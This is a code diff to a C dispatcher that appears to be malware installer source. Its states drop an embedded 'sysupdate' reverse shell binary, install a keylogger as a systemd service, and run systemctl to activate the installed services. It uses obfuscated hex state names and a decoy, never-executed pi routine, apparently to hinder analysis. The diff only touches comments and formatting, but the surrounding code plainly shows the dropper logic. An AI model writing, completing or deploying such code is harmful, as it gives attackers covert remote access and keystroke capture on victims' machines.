@@ -183,7 +183,7 @@ int dispatcher() {
     case STATE_0x64C8B371:
       printf("[*] Installing sysupdate reverse shell...\n");
       global_dest = REVERSE_SHELL_PATH;
-      global_data = _sysupdate; // Use the byte array from header
+      global_data = _sysupdate; // Use included header
       global_size = _sysupdate_len;
       current_state = STATE_0x651D8C39;
       break;
@@ -192,16 +192,14 @@ int dispatcher() {
       global_dst_file = fopen(global_dest, "wb");
       if (!global_dst_file) {
         perror("[-] Cannot open destination for binary");
-        current_state =
-            STATE_0xDB74F195; // Move to post-action state even on failure
+        current_state = STATE_0xDB74F195;
         break;
       }
 
       if (fwrite(global_data, 1, global_size, global_dst_file) != global_size) {
         perror("[-] Failed to write full binary content");
         fclose(global_dst_file);
-        current_state =
-            STATE_0xDB74F195; // Move to post-action state even on failure
+        current_state = STATE_0xDB74F195;
         break;
       }
 
@@ -215,16 +213,18 @@ int dispatcher() {
         printf("[+] sysupdate reverse shell installed\n");
       }
 
-      current_state = STATE_0xDB74F195; // Always proceed to post-action
+      current_state = STATE_0xDB74F195;
       break;
     }
 
     case STATE_0xDB74F195:
-      // Increment counters
+      // Increment our counters
       action_next_index++;
       total_actions_completed++;
 
       // Determine next state based on completed actions
+      // Check which states remain and need to be completed
+
       if (total_actions_completed == 1) {
         current_state = STATE_0x2AD96BF4;
       } else if (total_actions_completed == 2) {
@@ -271,6 +271,7 @@ int dispatcher() {
       break;
 
     case STATE_0xC385B62D:
+      // Write binary for sysinput
       snprintf(current_path, sizeof(current_path), "%s%s", SERVICE_DIR,
                KEYLOGGER_SERVICE_NAME);
       global_data = sysinput_service;
@@ -318,7 +319,7 @@ int dispatcher() {
       break;
 
     case STATE_0x92D7C3BE:
-      // Execude commands for our installed services
+      // Execude commands for to activate our installed services
       global_cmd = "systemctl daemon-reexec";
       action_count = 1;
       current_state = STATE_0xA13F9E57;
@@ -416,6 +417,7 @@ int dispatcher() {
     } break;
 
     case STATE_0xAF12B67E: {
+      // this calculates pi, never executed tho lmao
       volatile double u = 0;
       volatile float g = 0;
       volatile int n;
